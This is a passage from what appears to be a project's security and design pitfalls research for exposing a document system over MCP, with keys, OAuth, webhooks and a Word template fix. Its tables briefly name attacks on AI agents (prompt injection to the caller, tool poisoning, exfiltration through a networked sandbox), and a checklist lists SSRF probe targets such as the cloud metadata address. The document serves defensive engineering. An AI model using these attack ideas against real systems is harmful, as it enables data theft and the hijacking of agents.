- Keys logged via request/header dumps, SDK debug logging, LangSmith run metadata, audit `details`, or exception messages that include headers.

**How to avoid:**
- A recognizable key prefix plus checksum (so GitHub secret scanning / push protection can be enrolled later and a pasted key is greppable); show once; last-4 + `last_used_at` + client label visible; default expiry; one key per client.
- Docs show the environment-variable form (`${SYREL_MCP_KEY}`-style expansion) for Claude Code and Cursor configs, not a literal.
- Reuse `api_key_auth.py`'s discipline: log a 12-char fingerprint of the digest, never the key. Grep test: no `Authorization` header value in logs or traces from an MCP run.
- Never accept the key in a query string (spec MUST NOT; Claude docs repeat it).

**Phase to address:** MCP server + personal keys.

---

### Pitfall 21: Word template fix (BUG-261022-01) applied to the wrong copy, or breaking `{{ name.value }}`

**What the code says today (read 2026-10-30, HIGH that the probe's mechanism exists; still UNVERIFIED end-to-end):**
`_RENDER_DRIVER_SRC` in `backend/app/services/tools/render_template.py` builds the context with `_cell()`, which returns a **plain dict** `{"value", "source_chunk_id", "source_doc", "source_page"}`; there is no coercion step before `doc.render(context, jinja_env=SandboxedEnvironment(autoescape=True))`. A bare `{{ name }}` therefore stringifies the dict (autoescaped, which renders as visible `{'value': 'Ann', ...}` in Word). `residual_tags_in` only looks for `{{`, `}}`, `{%`, `%}` -- a dict repr has single braces, so it passes. And `residual_tags_in(docx)` scans **body paragraphs and top-level table cells only** -- not headers, footers, text boxes, footnotes or nested tables, so a leftover or a repr there also passes.

**Pitfalls in fixing it:**
- **Fixing without the repro.** The bug report itself says the probe skipped the real path. Drive it first through the sandbox driver with a real library template (bare token in body, in a table row loop `{{ r.cause }}`, and in a header).
- **Coercion that breaks existing templates.** If `_cell` returns a `dict` subclass with `__str__` returning the value, `{{ name.value }}` still works (Jinja getattr falls back to item lookup), but check: `{% if name %}` (a cell with empty value is still a truthy dict -- unchanged but surprising), filters (`|upper`, `|default` -- `default` does not fire for empty value), comparisons (`{% if name == 'x' %}` stays False against a dict). `_build_row` cells need the same treatment. `score` is a plain string and must keep working.
- **Two copies.** The driver says `_replace_in_paragraph` is a *"VERBATIM mirror of the audited production helper (`template_render_service._replace_in_paragraph`)"*; `template_render_service.py` also parses `{{ x.value }}` tokens. A fix in one copy only drifts.
- **Detection as well as (or instead of) coercion.** Extend the integrity check to fail on rendered record reprs (e.g., `'source_chunk_id'` appearing in output text) and to scan headers/footers. Either fix must make a bare token **either render the value or fail** -- the stated acceptance.
- **Golden runs.** Changing render semantics can flip publish-gauntlet golden runs for already-published workflows; re-run them.
- **No image rebuild needed** -- the driver ships into the container at call time -- unless a new library is added; then the sandbox tag bump + host rebuild + `sandbox-image-keeper` recreate (DEPLOYMENT-LESSONS B2) all apply.
- `render_template.py` is a G-5-firing hot file (`6 / 3 / 1163`): keep the change minimal and update its ledger row in the same commit.

**Phase to address:** Word template fix phase. Can go first and independently; the repro decides its size (if it is a few lines, G-3 says `/gsd:quick`).

---

## Moderate Pitfalls

### Pitfall 22: Error responses and refusals that leak existence
Phase 293's `/inbound` answers every miss with a byte-identical `404 Not found` (D-06). MCP tool errors must follow the same rule: a document outside the folder set, in another org, deleted, or nonexistent all return the same tool error. Distinguishable errors let a caller enumerate ids.
**Phase:** MCP server + personal keys.

### Pitfall 23: Hot-file growth from wiring a new door
`backend/app/main.py` (FIRING, `99 / 73 / 1021`), `config.py`, `dependencies.py`, `search_documents_tool.py`, `agent_loop.py`, `threads.py` are all G-5 firing. Put the MCP server in its own package with one `include`/mount line in `main.py`, keep tool handlers thin wrappers over existing services, and run `node scripts/check-hot-file-ledger.cjs <phase>` at plan time. The Extension Contract applies: the MCP tools wrap existing capabilities and add **no** engine tool, phase type or emitter (closed core stays 7 / 1 / 30).
**Phase:** every phase.

### Pitfall 24: Maintenance / setup middleware returning HTML or non-JSON-RPC bodies to MCP clients
`MaintenanceMiddleware` and `SetupMiddleware` wrap every route. An MCP client receiving an HTML 503 reports "couldn't reach". Return a JSON-RPC error body (no `id`) with the maintenance sentence on the MCP path.
**Phase:** MCP server + personal keys.

### Pitfall 25: New tables and SECURITY DEFINER functions granted to PUBLIC
`mcp_keys` (or an extension of `api_keys`), `webhook_endpoints`, `webhook_events`, `webhook_deliveries`, `oauth_clients`, `oauth_grants`. Postgres grants function `EXECUTE` to `PUBLIC` by default, so `REVOKE ... FROM anon` alone is a no-op -- revoke from `PUBLIC`, grant back explicitly. Run `get_advisors(security)` locally and in cloud after each migration; migrations are pasted, not `db push`ed.
**Phase:** every phase with a migration.

### Pitfall 26: Proxies buffering or timing out the SSE response
The spec says servers SHOULD send `X-Accel-Buffering: no`. The one-box nginx already sets `proxy_buffering off` and `proxy_read_timeout 300s` on `/api/` -- an MCP location outside `/api/` would not inherit it. Starlette `BaseHTTPMiddleware` buffers streams (the codebase already uses pure-ASGI middleware for this reason). If any CDN sits in front of the backend domain, its own origin timeout applies (Cloudflare's proxied default is ~100 s -- LOW, unverified whether one is in front here). Keep synchronous MCP responses short (Pitfall 7) and this mostly stops mattering.
**Phase:** MCP server + personal keys.

### Pitfall 27: Over-broad default keys
A key that can do everything the member can, forever, is the common default and the worst blast radius. Default new keys to read-only tools (search + list/read), an expiry, and an explicit opt-in for `ask_agent` and `run_workflow`. The spec's scope-minimization section lists "wildcard or omnibus scopes" and "bundling unrelated privileges" as common mistakes; the same applies to key grants and, later, to OAuth `scopes_supported`.
**Phase:** MCP server + personal keys; OAuth.

---

## Minor Pitfalls

- **Unknown-version handling.** Return `400` + `UnsupportedProtocolVersionError` with supported versions for unknown `MCP-Protocol-Version`; ignore `Mcp-Session-Id`/`Last-Event-ID` from old clients in stateless mode; 405 on GET/DELETE. Let the SDK do this rather than hand-rolling. (MCP server phase.)
- **IPv6-only DNS.** Claude connectors are IPv4-only; the backend host needs an A record. (MCP server phase / deploy checklist.)
- **Header/body mismatch.** Do not route or rate-limit on `Mcp-Name` without the SDK's header-body validation having run. (MCP server phase.)
- **Webhook clock skew.** Use the server's UTC clock for `webhook-timestamp`; document a 5-minute receiver tolerance. (Webhooks phase.)
- **Deleted documents still referenced by queued webhook events.** Thin payloads avoid shipping stale content; the event still delivers ids. (Webhooks phase.)

---

## Technical Debt Patterns

| Shortcut | Immediate Benefit | Long-term Cost | When Acceptable |
|----------|-------------------|----------------|-----------------|
| Separate resolver for MCP keys instead of extending `resolve_api_key` | Faster to write | Two membership/ban/revocation checks that drift (the W-1 class) | Never |
| Stateful SDK sessions | Server-initiated elicitation/sampling for legacy clients | Random "session not found" on 2 workers; sticky-session infra | Never on this deployment |
| Synchronous `ask_agent` / `run_workflow` returning the final answer | Simplest client UX | Timeouts, lost answers, double runs on retry | Only behind a hard internal deadline below 20-30 s, falling back to a handle |
| Visibility re-implemented in MCP SQL | No refactor of retrieval scope | Leak or under-return the first time visibility rules change | Never |
| Webhook firing via `create_task` after commit | No outbox table | Lost events on restart, duplicates across workers | Never |
| JWT-only OAuth validation | No DB hit per call | Removal, ban and kill switch delayed until token expiry | Only with access-token lifetime of minutes AND a revocation check -- simpler to look up per call |
| Regex-only PII redaction | Tiny, fast, no model | Misses names; false positives on ids | MVP if ids are excluded by field type and the gap is written down |
| Full-content webhook payloads | Receivers need no follow-up call | Content and PII leave to unmanaged endpoints | Never by default |

## Integration Gotchas

| Integration | Common Mistake | Correct Approach |
|-------------|----------------|------------------|
| Claude.ai custom connector | Expecting a personal bearer key to work | OAuth (CIMD or DCR); `static_headers` is an org-wide credential in beta |
| Claude.ai OAuth | `resource` built from the request (http, wrong path) | Configured canonical URL; PRM `resource` equals the URL users enter |
| Claude.ai OAuth | Token endpoint JSON-only | Accept `application/x-www-form-urlencoded`; respond within 10 s |
| Claude Code OAuth | Exact-match loopback redirect with a port | Port-agnostic match for `localhost` and `127.0.0.1` `/callback` |
| Claude Desktop (bearer key) | Key literal in `claude_desktop_config.json` via a bridge | Prefer OAuth connector; document env-var form; recognizable key prefix |
| Supabase OAuth server | Trusting `aud: authenticated` and scopes | Custom token hook `aud`; RESTRICTIVE RLS against `client_id` tokens; or opaque tokens mapped to the key grant |
| Supabase OAuth server | Expecting `/.well-known/oauth-authorization-server` | Supabase serves `/.well-known/openid-configuration` (Claude falls back to it) |
| MCP Python SDK 2.x mounted in FastAPI | Forgetting `session_manager.run()` in lifespan; default localhost host allowlist | Enter it in FastAPI lifespan; set `TransportSecuritySettings` explicitly |
| Coolify / Traefik + one-box nginx | `/.well-known` paths hitting the SPA fallback; redirect apex -> www | Explicit nginx location; register the non-redirecting URL |
| Webhook receivers (Zapier/n8n) | URL logged in full | URL is a secret; store encrypted, mask in UI and logs |
| Phase 300 notifications | MCP-started run pauses and emails the owner | MCP-origin runs never wait for a human; end with a link |

## Performance Traps

| Trap | Symptoms | Prevention | When It Breaks |
|------|----------|------------|----------------|
| Cursor/agent loops calling `search` in a tight loop | UI chat slows, provider 429s | Per-key + per-org limits; UI headroom in admission | One aggressive client |
| Embedding per MCP search on shared keys | Embedding provider 429 blocks ingestion | Count embeddings in provider admission; cache identical queries briefly | Tens of searches/second |
| Webhook retry backlog after an endpoint outage | Dispatcher lag for all endpoints | Per-endpoint concurrency cap; auto-disable; outbox index on `next_attempt_at` | A few thousand queued events |
| NER redaction on every chunk | Search latency +100s of ms | Redact only returned text, batch, measure on real corpus | Any interactive use |
| Re-index firing "ingested" for every document | Webhook storm | Event semantics = first searchable version; suppress during re-embed | Any re-embed |

## Security Mistakes

| Mistake | Risk | Prevention |
|---------|------|------------|
| MCP `ask_agent` with the full chat tool set | Outside-triggered exfil via networked sandbox / connector writes | Read-only closed tool set; `POWER_TOOLS` + connector writes denied |
| Accepting the app session JWT at `/mcp` | Token reuse across audiences | Require MCP-issued credential; validate audience |
| OAuth token valid at PostgREST | Narrowing bypass from a third party's servers | Audience hook + RESTRICTIVE RLS, or opaque tokens |
| Member-authored text in tool descriptions | Cross-user tool poisoning | Static tool descriptions; data in results only |
| Showing webhook response bodies | SSRF read oracle | Status code and short reason only |
| CIMD/logo fetch with a raw client | AS-side SSRF | Through `egress.py` |
| New tables without an anon test | BUG-260911-01 repeat | Anon-role test + `get_advisors(security)` |
| Distinguishable not-found errors | Id enumeration across orgs | One identical refusal (D-06) |

## UX Pitfalls

| Pitfall | User Impact | Better Approach |
|---------|-------------|-----------------|
| Key shown once with no client label | Cannot tell which leaked key to revoke | Label per client; last used + last-4 visible |
| Silent narrowing ("no results") when a document is outside the key's folders | Person thinks the KB lacks it | Tool result says the search was limited to N folders |
| Long task that just times out in Claude | "It's broken" | Return a handle and a plain sentence: "started, check with get_run" |
| Org MCP switch off with no explanation | Member's integration dies silently | Refusal names the reason (same sentence style as the workflows kill switch) |
| Webhook auto-disabled quietly | Integration stops, nobody knows | Notify owner through existing notification + email path |
| Personal key put into Claude.ai org headers | Whole Claude org acts as one person | Key screen states it; OAuth is the Claude.ai path |

## "Looks Done But Isn't" Checklist

- [ ] **MCP search:** tested as a member of TWO orgs with same-named docs -- verify zero cross-org results.
- [ ] **Folder narrowing:** one driven test per route (search, read, ask, run, views, relationships, memory) -- verify `[]` means nothing.
- [ ] **Tool subset:** `tools/call` of a hidden tool refused -- not just absent from the list.
- [ ] **Two workers:** verified against the deployed container with `WORKER_COUNT=2`, including a 2025-11-25 client.
- [ ] **Behind the proxy:** no 421, PRM over https with the right path, `/.well-known` returns JSON not HTML (cloud AND one-box).
- [ ] **Ex-member:** key, OAuth token, webhook and in-flight run each refused after removal.
- [ ] **Kill switch:** org MCP off refuses the next call on both workers.
- [ ] **ask_agent:** `harness_audit` shows no `execute_code`/`web_search`/connector write for MCP-origin runs; no network in any MCP sandbox.
- [ ] **Retries:** a re-issued start with the same idempotency key returns the same run id.
- [ ] **Webhooks:** every ingest path and every run-finalization path emits exactly one event; no duplicate across workers.
- [ ] **Webhook SSRF:** `169.254.169.254`, `localhost`, a rebinding host and a 302-to-internal are all refused at delivery time.
- [ ] **Signatures:** a receiver using a Standard Webhooks library verifies; a replay outside tolerance fails.
- [ ] **Redaction:** citations still resolve after redaction; redactor failure returns an error, not raw text.
- [ ] **Spend:** a search-only MCP session appears in operator spend.
- [ ] **New tables:** anon request refused; `get_advisors(security)` 0 ERROR locally and in cloud.
- [ ] **Docx:** bare `{{ name }}` in body, table row loop and header either renders the value or fails integrity; `{{ name.value }}` templates unchanged; golden runs re-run.
- [ ] **Cross-provider:** `ask_agent` over MCP scored on the full native roster + OpenRouter (UAT scoreboard rule), rows blocked are listed with reasons.

## Recovery Strategies

| Pitfall | Recovery Cost | Recovery Steps |
|---------|---------------|----------------|
| Cross-org / narrowing leak found in prod | HIGH | Org MCP kill switch off globally (operator), revoke affected keys, audit rows by key id to enumerate exposure, fix, notify |
| Leaked key in a public repo | LOW | Revoke by label; audit `last_used_at` and per-key audit rows for the window |
| OAuth token usable at PostgREST | HIGH | Apply RESTRICTIVE RLS migration immediately (approval-gated cloud write), revoke OAuth grants, rotate |
| Webhook duplicate storm | MEDIUM | Pause dispatcher; dedupe by event id; receivers dedupe by `webhook-id` anyway |
| Webhook SSRF found | HIGH | Disable webhooks feature flag; inspect delivery log for internal targets; patch through `egress.py` |
| Redaction breaking citations | LOW | Per-org toggle off; fix id-field exclusions |
| Docx fix breaks templates | MEDIUM | Revert driver change (ships at call time, no image rebuild); re-run golden runs |

## Pitfall-to-Phase Mapping

Phase names are suggestions (roadmap not yet written). Recommended order: **Word template fix -> MCP server + personal keys -> Ask/run over MCP + admission control -> Outbound webhooks -> PII redaction on outbound -> OAuth 2.1.**

| Pitfall | Prevention Phase | Verification |
|---------|------------------|--------------|
| 1 Service-role visibility | MCP server + keys | Two-org member test; non-owner shared-folder test |
| 2 Folder-set bypass | MCP server + keys (search/read); Ask/run (agent, workflow) | Per-route driven tests; `[]` test |
| 3 Tool subset at call | MCP server + keys | Hidden-tool call refused |
| 4 ask_agent trifecta | Ask/run | Audit shows no power tools; sandbox network none |
| 5 Injection to caller | MCP server + keys; PII | Red-team doc returned delimited with `origin` |
| 6 Tool poisoning | Ask/run | `tools/list` invariant under workflow publish |
| 7 Timeouts / double runs | Ask/run | Handle returned < 30 s; idempotent retry |
| 8 Sessions on 2 workers | MCP server + keys | No `Mcp-Session-Id`; legacy client on deployed 2-worker box |
| 9 Proxy / host / URLs | MCP server + keys; OAuth | Cloud + one-box curl checks |
| 10 Ex-member credentials | MCP server + keys; Webhooks; OAuth | Removal test per credential type |
| 11 Audience confusion | OAuth | Session JWT refused at `/mcp`; OAuth token refused at PostgREST |
| 12 Registration / consent | OAuth | Real Claude.ai connect + refresh + revoke; Claude Code loopback |
| 13 Webhook SSRF | Webhooks | Refusal corpus at delivery time |
| 14 Lost / duplicate / missed events | Webhooks | Every-path emission test; two-worker dedupe |
| 15 Signatures / secrets | Webhooks | Standard Webhooks library verifies; anon test |
| 16 Payload content | Webhooks | Payload schema has no content fields |
| 17 Admission control | Ask/run | Load test: UI unaffected while MCP saturates its share |
| 18 Cost attribution | MCP server + keys; Ask/run | Search-only session in spend |
| 19 PII redaction | PII (choke point stubbed in MCP server phase) | Citation round-trip; fail-closed test |
| 20 Key leakage | MCP server + keys | Log/trace grep for key material |
| 21 Docx bare token | Word template fix | Real sandbox driver repro then fix; golden runs |
| 22-27 Moderate | as listed | as listed |

**Research flags for phases:**
- **OAuth phase: needs its own research spike** -- Supabase OAuth server's CIMD support, loopback port-agnostic matching, refresh rotation and custom-token-hook `aud` are unverified (LOW). Decide Supabase OAuth server vs own AS with opaque tokens on evidence.
- **Ask/run phase: needs research on provider in-flight budgets** (SEED-081) and on actual client timeouts measured against Claude Code, Claude Desktop and Cursor (current figures are user reports).
- **PII phase: needs a measurement step** (false-positive rate and latency on the real corpus) before choosing NER vs regex.
- **MCP server + keys and Webhooks:** standard patterns; the reuse targets (`resolve_api_key`, `egress.py`, `rate_limit.py`, retrieval scope) already exist.

## Sources

Official / primary (HIGH):
- [MCP Security Best Practices (2026-07-28)](https://modelcontextprotocol.io/specification/latest/basic/security_best_practices) -- confused deputy, token passthrough, SSRF, state-handle hijacking, scope minimization, CIMD trust, localhost redirect impersonation
- [MCP changelog 2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28/changelog) -- sessions, handshake, `Last-Event-ID` removed; DCR deprecated; `iss` validation
- [MCP Streamable HTTP 2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28/basic/transports/streamable-http) -- Origin MUST, `X-Accel-Buffering`, header validation, cancellation, backward compatibility
- [MCP Authorization 2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization) -- RFC 8707 audience, RFC 9728 PRM, no tokens in query, refresh guidance
- [MCP python-sdk v2.0.0 release](https://github.com/modelcontextprotocol/python-sdk/releases/tag/v2.0.0) and [migration guide](https://py.sdk.modelcontextprotocol.io/migration/) -- stateless mode, lifespan, `TransportSecuritySettings`, 421, 4 MiB cap
- [Claude connectors: Authentication](https://claude.com/docs/connectors/building/authentication) -- auth types, static headers are org-wide, callback URLs, 10 s/30 s budgets, refresh rotation, egress range
- [Claude connectors: Troubleshooting](https://claude.com/docs/connectors/building/troubleshooting) -- IPv4-only, redirect drops Authorization, canonical audience, Supabase serves openid-configuration
- [Supabase OAuth server token security](https://supabase.com/docs/guides/auth/oauth-server/token-security) and [MCP authentication](https://supabase.com/docs/guides/auth/oauth-server/mcp-authentication) -- `aud: authenticated`, `client_id` claim, scopes do not limit DB access
- [Standard Webhooks spec](https://github.com/standard-webhooks/standard-webhooks/blob/main/spec/standard-webhooks.md) -- headers, signing, secrets, retries, thin payloads, SSRF, 3xx handling
- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html) (referenced by the MCP spec)

Secondary (MEDIUM / LOW):
- [Simon Willison, The lethal trifecta](https://simonwillison.net/2025/jun/16/the-lethal-trifecta/) (MEDIUM)
- [Invariant Labs, MCP tool poisoning](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks) (MEDIUM, from training knowledge)
- Client timeout reports: [claude-code #22542](https://github.com/anthropics/claude-code/issues/22542), [claude-code #64614](https://github.com/anthropics/claude-code/issues/64614), [sunpeak connector blog](https://sunpeak.ai/blogs/how-claude-connectors-work) (LOW -- conflicting 60 s / 240 s / 300 s figures)
- [MCP stateless explainer (DEV)](https://dev.to/krlz/mcp-went-stateless-what-the-2026-07-28-spec-actually-changes-273k) (LOW, corroborating)

Codebase (read 2026-10-30, HIGH):
- `backend/app/security/egress.py` (validate/pin/bind, closed capability set, RESIDUAL-190-01, `validate_mcp_destination`)
- `backend/app/security/api_key_auth.py` (`resolve_api_key`: per-call revoked/expired/member/ban, fingerprint logging)
- `backend/app/api/inbound.py` (Phase 293 D-06 identical 404, D-12 key-bound run reads, D-13 TRUST-03 envelope)
- `backend/app/services/unattended_launch.py` (ctx-builder drift warning, finalizer, kill switch)
- `backend/app/services/sandbox_service.py` + `describe_draft_guards.py` (sandbox has no network restriction; `POWER_TOOLS`)
- `backend/app/services/tools/render_template.py` (`_cell` plain dict, `residual_tags_in` scope, mirrored helper)
- `backend/app/services/rate_limit.py` (Redis limiter, proxy-IP caveat), `frontend/nginx.conf` (`/api/` rewrite, SPA fallback, buffering off), `backend/Dockerfile` (2 workers)
- `docs/DEPLOYMENT-LESSONS.md` (A1, A2, B2, B3, B4, recurring themes), `.planning/milestones/v4.8-MILESTONE-AUDIT.md` (W-1), seeds SEED-079, SEED-081, SEED-195, `.planning/reported-bugs/docx-template-bare-token-may-render-a-dict-repr.md`

---
*Pitfalls research for: v4.9 Use It From Your Own Tools (MCP server, personal keys, OAuth 2.1, webhooks, admission control, PII redaction, docx fix)*
*Researched: 2026-10-30*
